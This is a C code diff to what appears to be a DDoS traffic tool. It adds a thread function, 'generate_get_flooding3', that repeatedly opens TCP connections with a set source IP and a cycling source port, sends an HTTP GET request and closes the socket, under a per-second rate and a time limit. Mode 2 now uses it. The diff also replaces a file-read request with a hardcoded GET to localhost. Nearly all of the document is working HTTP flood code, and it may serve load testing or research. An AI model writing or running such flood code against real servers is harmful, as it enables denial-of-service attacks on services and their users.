@@ -121,6 +121,52 @@ void* generate_get_flooding2(void *data) {
 	return 0;
 }
 
+void* generate_get_flooding3(void *data) {
+	int thread_id = *((int*) data);
+	clock_t thread_clock;
+
+	int sock;
+	while (1) {
+
+		pthread_mutex_lock(&get_mutex);
+		thread_clock = clock();
+		get_elapsed_time = ((double) (thread_clock - get_global_elapsed_time))
+								/ CLOCKS_PER_SEC;
+
+		if (get_elapsed_time >= get_duration) {
+			pthread_mutex_unlock(&get_mutex);
+			pthread_cond_broadcast(&get_cond);
+			get_timed_finisher=1;
+			return 0;
+		}
+
+		if (get_produced >= get_per_second) {
+			pthread_cond_wait(&get_cond, &get_mutex);
+		}
+
+		int sock = tcp_make_connection(inet_addr(get_src_ip), inet_addr(get_dest_ip),
+					get_src_port, get_dest_port, SOCK_STREAM);
+			get_src_port++;
+			if(get_src_port >= 65000)
+						get_src_port= 10000;
+
+
+
+		send(sock,get_request,strlen(get_request),0);
+
+		get_produced++;
+		get_total++;
+		get_generated_count++;
+
+		pthread_cond_signal(&get_cond);
+		close(sock);
+		pthread_mutex_unlock(&get_mutex);
+
+	}
+
+	return 0;
+}
+
 void* get_time_check(void *data) {
 	int thread_id = *((int*) data);
 	clock_t t1;
@@ -151,6 +197,7 @@ void get_flood_run(char *argv[], int mode) {
 
 	FILE *get_f;
 
+	/* Will be implemented Later....
 	get_f=fopen("./src/ddos/http_request.txt","rb");
 	if(get_f==NULL)
 	{
@@ -164,9 +211,11 @@ void get_flood_run(char *argv[], int mode) {
 		strcat(get_request,"\r\n");
 	}
 	strcat(get_request,"\r\n");
-
-	printf("Requesting:\n%s\n",get_request);
 	fclose(get_f);
+*/
+	strcpy(get_request,	"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
+	printf("Requesting:\n%s\n",get_request);
+
 
 
 	get_src_ip = (char*) malloc(sizeof(char) * 20);
@@ -242,7 +291,7 @@ void get_flood_run(char *argv[], int mode) {
 		if (mode == 2)
 		{
 			printf("thread %d created\n",i);
-			pthread_create(&generate_thread[i], NULL, generate_get_flooding2,
+			pthread_create(&generate_thread[i], NULL, generate_get_flooding3,
 								(void*) &generate_thread_id[i]);
 			/*RECEIVE THREAD DEACTIVATION*/
 			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
